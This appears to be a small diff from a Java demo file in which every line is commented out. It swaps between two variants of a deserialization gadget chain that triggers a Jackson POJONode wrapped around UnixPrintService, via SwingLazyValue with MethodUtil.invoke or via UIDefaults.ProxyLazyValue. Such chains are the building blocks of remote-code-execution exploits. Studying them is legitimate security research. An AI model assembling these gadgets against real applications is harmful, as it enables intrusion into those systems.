@@ -97,14 +97,9 @@ public class Demo {
 //
 //        POJONode pojoNode = new POJONode(unixPrintService);
 //
-////        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
-////        Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
-////        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});
-//        UIDefaults.ProxyLazyValue swingLazyValue = new UIDefaults.ProxyLazyValue("java.lang.String", "valueOf", new Object[]{pojoNode});
-//
-//        Field accField = UIDefaults.ProxyLazyValue.class.getDeclaredField("acc");
-//        accField.setAccessible(true);
-//        accField.set(swingLazyValue, null);
+//        Method invoke = MethodUtil.class.getDeclaredMethod("invoke", Method.class, Object.class, Object[].class);
+//        Method exec = String.class.getDeclaredMethod("valueOf", Object.class);
+//        SwingLazyValue swingLazyValue = new SwingLazyValue("sun.reflect.misc.MethodUtil", "invoke", new Object[]{invoke, new Object(), new Object[]{exec, new String("123"), new Object[]{pojoNode}}});
 //
 //        UIDefaults u1 = new UIDefaults();
 //        UIDefaults u2 = new UIDefaults();
